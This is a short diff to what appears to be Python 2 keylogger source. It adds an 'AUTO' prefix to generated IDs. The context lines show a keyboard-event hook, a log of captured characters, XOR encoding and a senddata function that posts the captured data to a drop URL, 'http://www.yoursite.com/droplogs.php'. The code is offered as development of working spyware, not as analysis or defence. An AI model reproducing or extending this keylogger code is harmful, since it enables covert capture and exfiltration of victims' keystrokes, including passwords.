@@ -34,7 +34,9 @@ import urllib2
 import random
 import string
 
-nextid = ''.join([random.choice('abcdefghijklmnoprstuvwyxzABCDEFGHIJKLMNOPRSTUVWXYZ') for i in range(20)])
+prefix = 'AUTO'
+
+nextid = prefix + ''.join([random.choice('abcdefghijklmnoprstuvwyxzABCDEFGHIJKLMNOPRSTUVWXYZ') for i in range(20)])
 loggedchars = ''
 
 def xorenc(ptext, key):
@@ -88,7 +90,7 @@ def OnKeyboardEvent(event):
 def senddata(data):
     global nextid
     url = 'http://www.yoursite.com/droplogs.php'
-    calcnextid = ''.join([random.choice('abcdefghijklmnoprstuvwyxzABCDEFGHIJKLMNOPRSTUVWXYZ') for i in range(20)])
+    calcnextid = prefix + ''.join([random.choice('abcdefghijklmnoprstuvwyxzABCDEFGHIJKLMNOPRSTUVWXYZ') for i in range(20)])
     values = {'d' : data,
               'i' : nextid,
               'ni' : calcnextid,
